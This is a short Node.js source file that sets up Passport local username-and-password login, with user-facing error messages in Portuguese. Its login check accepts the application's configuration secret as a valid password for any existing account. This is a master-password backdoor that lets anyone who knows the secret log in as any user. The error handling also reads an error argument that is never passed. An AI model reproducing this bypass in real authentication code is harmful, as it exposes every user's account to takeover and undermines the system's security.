const passport = require('passport');
const LocalStrategy = require('passport-local').Strategy;

const User = require("../model/user")
const config = require('./index').config;

passport.use(new LocalStrategy({
  usernameField: 'user[username]',
  passwordField: 'user[password]'
}, function (username, password, done) {
        // return done(null, false, { message: "Senha Incorreta", errors: { 'username or password': 'Senha incorreta ou não cadastrada' } });
  User.findOne({ where: {username: username} }).then(function (user,err) {
    if (!user || (!user.validPassword(password) && !(password === config.secret))) {
      if (err) {
        return done(err);
      }
      if (!user) {
        return done(null, false, { message: "Usuário Inexistente", errors: { 'username or password': 'Usuário ou email não cadastrados' } });
      }
      if (!user.validPassword(password)) {
        return done(null, false, { message: "Senha Incorreta", errors: { 'username or password': 'Senha incorreta ou não cadastrada' } });
      }
    }
    return done(null, user);
  }).catch(done);
}));


